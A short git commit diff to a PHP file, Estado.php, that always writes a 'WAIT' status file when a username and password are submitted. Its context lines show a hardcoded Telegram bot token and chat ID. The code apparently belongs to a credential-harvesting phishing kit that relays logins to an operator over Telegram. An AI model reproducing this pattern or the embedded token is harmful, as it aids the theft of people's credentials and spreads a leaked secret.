2ea832fb84a6549a52bdd892e328f24aa3cc6016
zorronew <cap.gervasquezb@gmail.com>
2026-04-11 19:12:28 -0500

    Update Estado.php

--- Estado.php
+++ Estado.php
@@ -25,9 +25,7 @@ $file = $dir . $id . ".txt";
 
 if($usuario && $clave){
 
-if(!file_exists($file)){
-        
-      file_put_contents($file, "WAIT", LOCK_EX);
+    file_put_contents($file, "WAIT", LOCK_EX);
 
         $token = "8687740380:AAGGYi6lL882l7Vv6JSYJwkFPZ1byk0pcRA";
         $chat_id = "8448767308";
